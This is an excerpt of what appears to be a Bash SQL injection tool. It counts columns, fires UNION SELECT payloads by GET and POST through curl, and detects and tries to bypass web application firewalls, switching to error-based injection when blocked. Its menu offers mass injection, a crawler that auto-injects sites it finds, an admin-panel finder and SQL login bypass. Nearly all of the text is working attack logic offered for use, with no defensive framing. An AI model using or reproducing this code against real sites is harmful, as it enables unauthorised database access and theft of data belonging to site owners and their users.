       echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
        if [[ -z "$ls" ]]; then
           echo -e "${R}\033[2mFAILED: empty query URL, skipping dios${N}"
           continue
        fi
       if [[ "$postd" = "y" ]]
       then
...
inject() {
rm -f .rdy
echo -n -e "\x1b[0m${N}[${BL}`date +%T`${N}] starting to count order by ~"
trap break 4 INT
for i in $(seq $order_start $order_by)
  do
    printf "\r\x1b[0m${N}[${BL}`date +%T`${N}] starting to count order by ${i}" $((secs--))
    if [[ "$force_plain" = "y" ]]; then
       colom=$(seq -s "," 1 ${i})
    else
          ...
          m1=$(echo $site | awk -F "/" '{print $(NF)}' | grep -o "[0-9]*" | head -1)
           if [[ "$m1" = "" ]]
            then
              ...
              param=$(echo "$site" | sed "s/$m2/'$m2/g") #delimiter comma
              param1=$(echo "$param" | cut -d "'" -f1)
              param2=$(echo "$param" | cut -d "'" -f2)
            else
              param=$(echo "$site" | sed "s/$m1/$m1'/g") #delimiter comma
              param1=$(echo "$param" | cut -d "'" -f1)
              param2=$(echo "$param" | cut -d "'" -f2)
            fi
           ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s  "$param1${quote_test}$union$colom--+$param2" -L | tr -d '\0' | sed 's/\r$//')
         else
           if [[ "$postd" = "y" ]]; then
              ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sX POST  "$site" -L --data "$postnya=null${quote_test}$union$colom--+" | tr -d '\0' | sed 's/\r$//')
           else
           if [[ "$force_plain" = "y" ]]; then
              # Use %20 and negative ID
              local _site_neg=$(echo "$site" | sed -r 's/([?&][^=]+=)([0-9]+)/\1-\2/')
              ngecur=$(curl -A "Mozilla/5.0" --max-time $time_out -s  "${_site_neg}%20UNION%20SELECT%20$colom%20--+-" -L | tr -d '\0' | sed 's/\r$//')
           else
              ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s  "$site${quote_test}$union$colom--+" -L | tr -d '\0' | sed 's/\r$//')
           fi
           fi
        fi
   fi
   ...
   if [ $? -eq 0 ]
    then
    if echo -e "$ngecur" | grep -q -P -i 'Forbidden|forbidden|Not Acceptable|Internal Server Error'
      then
       if [[ "$force_plain" = "y" ]]; then
          echo -e "${R}[!] Site blocked even in PLAIN mode. Payload: ${N}$colom"
          # Stop this thread
       ...
       do
         ...
         echo -e "\n\x1b[0m${N}[${R}`date +%T`${N}] ${N}\033[2mWAF Bypassing${N}\n\x1b[0m${N}[${N}\033[2;35m`date +%T`${N}]${O}\033[2m trying bypass with $union"
         cek=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site${quote_test}${union}1,2,3--+" | tr -d '\0' | sed 's/\r$//')
          if [ $? -eq 0 ]
          then
            if echo -e "$cek" | grep -Po 'You are unable to access|Not Acceptable|blocked|connection was reset|Forbidden|forbidden|Not Acceptable|Internal Server Error' | head -1 > .waf; then
              if [ -s .waf ]; then
                 echo -e "\x1b[0m${N}[${N}\033[2;35m`date +%T`${N}] ${R}Blocked $union\n\x1b[0m${N}[${N}\033[2;35m`date +%T`${N}]${O}\033[2m WAF Type `cat .waf | head -1`${N}"
              else
                 echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${G}\033[2mWAF Bypassed continue inject again${N}"
                 union="${quote_test}${union}"
                 echo ".rdy" > .rdy
                 break
              fi
            fi
       ...
       if cat .rdy 2>/dev/null | grep -q "."
       then
          skip_auto_identify="y"
          sqli
      else
          echo -e "\x1b[0m${N}[${R}`date +%T`${N}] ${R}All WAF bypass failed${N} - ${O}auto switching to ERROR based SQLi${N}"
          esql
      fi
      break
     fi
     ...
     if [[ "$force_plain" = "y" ]]; then
        echo "$ngecur" | grep -a -o -E "[0-9]+" | sort -u | uniq > .angka
     else
        echo "$ngecur" | grep -Po "kedjaw3n3|kedjaw3n[0-9]*" > .angka
     fi
      if [[ -s .angka ]]; then
      if echo "$colom" | grep -Po "," >/dev/null
       ...
       mkdir -p output/$dir
       echo -e -n "\a\n\x1b[0m${N}[${G}\033[2m`date +%T`${N}] order by found ${i} colom"
       echo -e -n "\n$N[${G}INFO${N}]${G} Site $dir injected $O\n"
        # --- CACHE SAVE ---
        echo "SITE=$site" > output/$dir/injection_cache.txt
        echo "METHOD=union" >> output/$dir/injection_cache.txt
        echo "UNION_STR=$union" >> output/$dir/injection_cache.txt
        echo "COLUMNS=$i" >> output/$dir/injection_cache.txt
        # ------------------
       info
       ...
       if [[ "$based64" = "y" ]]
         then
          ...
          echo -e "${O}numbers displayed:$G $angka$N\n" | sed 's/kedjaw3n//g'
       else
          if [[ "$html" = "y" ]]
          then
...
tanya() {
  echo -e "\n${B}~ ${N}\033[2mGive support to developer so this tool can develop further${N}"
...
[${O}3${N}]. SQLi Base64 injection
[${O}4${N}]. SQLi POST method
[${O}5${N}]. SQLi ERROR Based method
[${O}6${N}]. Scan site + auto inject ( web crawler )
[${O}7${N}]. Hash tools
[${O}8${N}]. New Admin Finder
[${O}9${N}]. auto bypass sql login tools${N}
 ...
 2) masn="y"
  ...
  4) masn="n"
   ...
   5) clear
     ...
     echo -e "[${G}1${N}]. normal inject"
     echo -e "[${G}2${N}]. mass inject"
     echo -e "[${G}3${N}]. return to main menu"
     echo -ne "[${R}?${N}] which one ?? "
     read d
     case $d in
      1) masn="n"
   ...
   6) clear
     ...
     echo -e "[${G}1${N}]. normal scan"
     echo -e "[${G}2${N}]. mass scan"
     echo -e "[${G}3${N}]. return to main menu"
     echo -ne "[${R}?${N}] which one ?? "
     read d
     case $d in
   ...
   8) clear
      ...
      2) clear
      banner${angkab}
      echo -e "                   |\033[7;32m ADMIN FINDER MASS ${N}|\n"
